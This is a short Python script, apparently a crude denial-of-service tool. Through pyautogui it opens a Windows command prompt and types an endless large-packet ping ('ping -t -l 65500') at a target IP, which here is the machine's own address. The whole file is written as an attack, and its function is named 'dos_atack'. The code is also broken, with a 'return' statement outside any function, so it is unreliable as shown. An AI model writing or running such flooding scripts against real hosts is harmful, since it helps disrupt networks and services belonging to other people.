import os
from pyautogui import press,write
from time import sleep
import socket
import psutil


try:
    hostname = socket.gethostname()
    local_ip_adress = socket.gethostbyname(hostname)

except socket.error:
    print("Невозможно определить IP")
    return False


def dos_atack(target_ip):
    try:
        os.system("start cmd")
        sleep(3)
        for proc in psutil.process_iter(["name"]):
            if proc.info["name"] == "cmd.exe":
                sleep(3)

                write(f"ping -t -l 65500 {target_ip}")
                sleep(0.1)
                press("enter")
                return True

    except Exception as e:
        return False


if __name__ == "__main__":
    dos_atack(local_ip_adress)
